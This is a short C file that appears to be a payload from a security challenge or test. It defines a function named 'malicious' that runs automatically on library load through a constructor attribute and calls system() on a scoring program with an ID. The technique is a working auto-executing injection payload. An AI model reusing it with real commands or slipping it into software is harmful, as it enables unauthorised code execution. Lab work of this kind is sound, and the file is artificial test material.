#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	    system("/usr/local/bin/score 1849885b-0cc5-431b-bfa9-f3c0623420d2");
}
